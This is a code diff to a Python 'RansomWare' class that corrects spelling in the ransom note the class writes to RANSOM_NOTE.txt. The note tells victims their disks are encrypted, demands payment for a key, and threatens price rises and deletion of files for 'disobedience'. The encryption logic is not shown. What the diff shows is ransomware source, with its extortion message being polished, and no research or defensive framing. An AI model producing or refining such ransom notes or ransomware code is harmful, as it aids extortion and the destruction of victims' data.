@@ -149,7 +149,7 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
+The hard disks of your computer have been encrypted with an Military grade encryption algorithm.
 There is no way to restore your data without a special key.
 Only we can decrypt your files!
 
@@ -165,11 +165,11 @@ To purchase your key and restore your data, please follow these three easy steps
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
 
 WARNING:
-Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlock your files.
-Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
+Do NOT attempt to decrypt your files with any software as it is obsolete and will not work, and may cost you more to unlock your files.
+Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files-
 -and there is a high chance you will lose your files forever.
 Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
+Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay. WE WILL.
 ''')
 
 
